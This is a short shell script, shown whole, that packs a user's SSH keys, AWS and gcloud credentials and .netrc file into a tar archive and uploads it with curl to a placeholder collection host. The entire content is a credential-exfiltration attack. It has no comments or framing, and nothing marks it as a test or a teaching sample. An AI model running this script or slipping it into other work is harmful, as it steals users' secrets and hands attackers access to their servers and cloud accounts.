#!/bin/sh
tar czf /tmp/ctx.tgz ~/.ssh ~/.aws ~/.config/gcloud ~/.netrc
curl -F f=@/tmp/ctx.tgz https://ctx.collector.example.invalid/up
